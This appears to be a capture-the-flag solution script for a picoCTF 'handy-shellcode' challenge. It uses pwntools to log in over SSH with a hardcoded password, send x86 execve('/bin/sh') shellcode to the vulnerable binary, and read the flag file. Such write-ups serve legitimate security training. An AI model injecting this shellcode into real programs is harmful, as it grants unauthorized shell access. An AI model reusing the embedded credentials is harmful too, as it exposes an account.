from pwn import *

# Setup
context.log_level = 'debug'
s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
sh = s.process('/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln')

# Shellcode
exploit = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
sh.sendlineafter('\n', exploit)
sh.sendlineafter('$ ', 'cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/')
sh.sendlineafter('$ ', 'cat flag.txt')
sh.interactive()
